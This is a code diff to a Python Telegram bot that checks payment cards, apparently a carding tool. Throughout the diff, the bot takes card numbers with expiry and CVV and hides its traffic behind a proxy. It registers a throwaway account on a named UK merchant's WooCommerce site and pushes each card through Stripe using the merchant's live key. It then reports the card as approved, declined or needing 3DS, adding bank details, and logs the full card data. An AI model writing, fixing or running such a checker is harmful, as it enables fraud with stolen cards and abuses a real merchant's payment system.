@@ -42,9 +42,7 @@ async def get_bin_details(cc_number):
     """Fetch BIN details from AntiPublic API"""
     bin_number = cc_number[:6]
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
-    
     try:
-        # Use proxy for BIN lookup too
         connector = ProxyConnector.from_url(PROXY_URL)
         async with aiohttp.ClientSession(connector=connector) as session:
             async with session.get(url, timeout=10) as response:
@@ -78,12 +76,10 @@ async def process_cc_check(card_data, user_info=""):
     try:
         cc, mon, year, cvv = card_data.split('|')[:4]
         year = year[-2:] if len(year) == 4 else year
-        
+
         logger.info(f"Processing card: {cc}|{mon}|{year}|{cvv} for user: {user_info}")
 
-        # Proxy configuration - FIXED
         connector = ProxyConnector.from_url(PROXY_URL)
-
         async with aiohttp.ClientSession(connector=connector, trust_env=True) as session:
             headers = {
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -98,14 +94,11 @@ async def process_cc_check(card_data, user_info=""):
                 method="GET",
                 headers=headers,
             )
-            
             if req is None or status != 200:
                 return "❌ Failed to connect to website"
-            
             nonce = parseX(req, 'name="woocommerce-register-nonce" value="', '"')
             if nonce == "None":
                 return "❌ Could not access the payment gateway"
-            
             await asyncio.sleep(1)
 
             # Step 2: Register account
@@ -115,7 +108,6 @@ async def process_cc_check(card_data, user_info=""):
                 "origin": "https://www.georgedaviesturf.co.uk",
                 "referer": "https://www.georgedaviesturf.co.uk/my-account",
             })
-            
             random_email = generate_random_email()
             data2 = {
                 "email": random_email,
@@ -123,17 +115,14 @@ async def process_cc_check(card_data, user_info=""):
                 "_wp_http_referer": "/my-account/",
                 "register": "Register",
             }
-
             req2, status2 = await make_request(
                 session,
                 "https://www.georgedaviesturf.co.uk/my-account/",
                 headers=headers2,
                 data=data2,
             )
-            
             if req2 is None or status2 != 200:
                 return "❌ Failed to register account"
-            
             await asyncio.sleep(1)
 
             # Step 3: Get payment method page
@@ -143,12 +132,9 @@ async def process_cc_check(card_data, user_info=""):
                 method="GET",
                 headers=headers,
             )
-            
             if req3 is None or status3 != 200:
                 return "❌ Failed to load payment page"
-            
             await asyncio.sleep(2)
-            
             rest_nonce = parseX(req3, '"createAndConfirmSetupIntentNonce":"', '"')
             if rest_nonce == "None":
                 return "❌ Payment gateway error"
@@ -160,7 +146,6 @@ async def process_cc_check(card_data, user_info=""):
                 "origin": "https://js.stripe.com",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
             }
-
             form_data4 = {
                 "type": "card",
                 "card[number]": cc,
@@ -171,17 +156,14 @@ async def process_cc_check(card_data, user_info=""):
                 "billing_details[address][country]": "US",
                 "key": "pk_live_51OCKXEAPMeRp4YIca4hWzwyYQnAllzcTDlBQ76zKfkErhZEyh5aOPCLixfOnAt1oV31EfTX2CGTu40JVnrLvQL7r0078s5MPx5",
             }
-            
             req4, status4 = await make_request(
                 session,
                 url="https://api.stripe.com/v1/payment_methods",
                 headers=headers4,
                 data=form_data4,
             )
-            
             if req4 is None:
                 return "❌ Failed to create payment method"
-            
             pmid = parseX(req4, '"id": "', '"')
             if pmid == "None":
                 error_msg = parseX(req4, '"message": "', '"')
@@ -197,51 +179,47 @@ async def process_cc_check(card_data, user_info=""):
                 "referer": "https://www.georgedaviesturf.co.uk/my-account/add-payment-method",
                 "x-requested-with": "XMLHttpRequest",
             }
-            
             data5 = {
                 "action": "wc_stripe_create_and_confirm_setup_intent",
                 "wc-stripe-payment-method": pmid,
                 "wc-stripe-payment-type": "card",
                 "_ajax_nonce": rest_nonce,
             }
-            
             req5, status5 = await make_request(
                 session,
                 url="https://www.georgedaviesturf.co.uk/wp-admin/admin-ajax.php",
                 headers=headers5,
                 data=data5,
             )
-
             if req5 is None:
                 return "❌ Failed to process payment"
 
-            # FIXED: Better response parsing to avoid 'str' object has no attribute 'get'
             logger.info(f"Final response: {req5}")
-            
             # Check if it's JSON or plain text
+            response_data = None
             if req5.strip().startswith('{') and req5.strip().endswith('}'):
                 try:
                     response_data = json.loads(req5)
-                    if isinstance(response_data, dict):
-                        if response_data.get('success') is True:
-                            if 'succeeded' in str(response_data):
-                                return await handle_success_response(cc, mon, year, cvv)
-                            elif 'requires_action' in str(response_data):
-                                return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
-                        else:
-                            # Defensive check for dict
-                            data_field = response_data.get('data')
-                            error_msg = None
-                            if isinstance(data_field, dict):
-                                error_msg = data_field.get('message')
-                            if not error_msg:
-                                error_msg = response_data.get('message', 'Card declined')
-                            return f"❌ **DECLINED** - {error_msg}"
                 except Exception as ex:
                     logger.error(f"JSON parsing error: {ex}")
-                    pass
-            
-            # String-based parsing as fallback
+                    response_data = None
+
+            if response_data and isinstance(response_data, dict):
+                if response_data.get('success') is True:
+                    data_field = response_data.get('data')
+                    if isinstance(data_field, dict) and data_field.get('status') == 'succeeded':
+                        return await handle_success_response(cc, mon, year, cvv)
+                    elif isinstance(data_field, dict) and data_field.get('status') == 'requires_action':
+                        return "⚠️ **3DS REQUIRED** - Card requires additional authentication"
+                else:
+                    error_msg = None
+                    data_field = response_data.get('data')
+                    if isinstance(data_field, dict):
+                        error_msg = data_field.get('message')
+                    if not error_msg:
+                        error_msg = response_data.get('message', 'Card declined')
+                    return f"❌ **DECLINED** - {error_msg}"
+            # Fallback string parsing
             if "succeeded" in req5.lower():
                 return await handle_success_response(cc, mon, year, cvv)
             elif "requires_action" in req5.lower():
@@ -266,7 +244,6 @@ async def handle_success_response(cc, mon, year, cvv):
         bank = bin_info.get('bank', {}).get('name', 'Unknown')
         country = bin_info.get('country', {}).get('name', 'Unknown')
         brand = bin_info.get('brand', 'Unknown')
-        
         return f"""✅ **APPROVED** 
 💳 Card: `{cc}|{mon}|{year}|{cvv}`
 🏦 Bank: {bank}
@@ -282,9 +259,7 @@ def validate_cc_format(cc_text):
         parts = cc_text.split('|')
         if len(parts) < 4:
             return False
-        
         cc, mon, year, cvv = parts[:4]
-        
         if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
             return False
         if not mon.isdigit() or not (1 <= int(mon) <= 12):
@@ -293,7 +268,6 @@ def validate_cc_format(cc_text):
             return False
         if not cvv.isdigit() or len(cvv) not in [3, 4]:
             return False
-            
         return True
     except:
         return False
@@ -320,22 +294,15 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
         message_text = update.message.text
-        
         if not validate_cc_format(message_text):
             await update.message.reply_text(
                 "❌ **Invalid Format**\n\nPlease send CC in format:\n`cc_number|mm|yyyy|cvv`\n\nExample: `4111111111111111|12|2025|123`",
                 parse_mode='Markdown'
             )
             return
-        
-        # Send processing message
         processing_msg = await update.message.reply_text("🔄 Processing your card...")
-        
-        # Process the card
         user_info = f"@{update.effective_user.username}" if update.effective_user.username else f"UserID: {user_id}"
         result = await process_cc_check(message_text, user_info)
-        
-        # Update the message with result
         await context.bot.edit_message_text(
             chat_id=update.effective_chat.id,
             message_id=processing_msg.message_id,
@@ -350,34 +317,26 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle errors - FIXED to ignore the conflict error"""
     error = context.error
     if "Conflict: terminated by other getUpdates request" in str(error):
-        # Ignore this error - it's harmless when multiple instances try to start
         logger.warning("Another bot instance is running, this is normal during deployment")
         return
-    
     logger.error(f"Error: {error}")
     if update and update.effective_message:
         try:
             await update.effective_message.reply_text("❌ An error occurred. Please try again later.")
         except:
-            pass  # Ignore errors when sending error messages
+            pass
 
 def main():
     """Start the bot"""
     logger.info("🤖 Bot is starting with proxy...")
-    
-    # Create application with better error handling
     try:
         application = Application.builder().token(BOT_TOKEN).build()
-        
-        # Add handlers
         application.add_handler(CommandHandler("start", start_command))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cc_message))
         application.add_error_handler(error_handler)
-        
-        # Start the bot with connection retries
         application.run_polling(
             allowed_updates=Update.ALL_TYPES,
-            drop_pending_updates=True  # Clear any pending updates on start
+            drop_pending_updates=True
         )
     except Exception as e:
         logger.error(f"Failed to start bot: {e}")
